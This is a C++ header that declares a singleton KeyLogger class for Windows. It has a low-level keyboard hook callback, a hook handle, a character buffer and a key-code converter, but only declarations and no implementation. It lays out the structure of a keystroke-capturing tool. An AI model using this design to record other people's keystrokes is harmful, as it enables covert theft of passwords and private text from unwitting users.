#pragma once
#include "runnible.h"
#include "Buffer.h"
#include "VirtulKeyCodeToCharConverter.h"

class KeyLogger :
	public Runnible
{
public:
	static KeyLogger* GetInstance();
	void SetBuffer(Buffer*);
	Buffer* GetBuffer();
protected:
	void OnEnable();
	void OnDisable();
private:

	~KeyLogger(void);
	KeyLogger();
	static KeyLogger *m_pInstance;
	Buffer *m_pBuffer;
	VirtulKeyCodeToCharConverter *m_pConverter;
	HHOOK m_hhk;

	TCHAR m_keyChar;
	TCHAR m_deadKeyChar;
	static LRESULT CALLBACK onKeybordEvent(int code,WPARAM wParam,LPARAM lParam);
	void addToBuffer(KBDLLHOOKSTRUCT*);
};
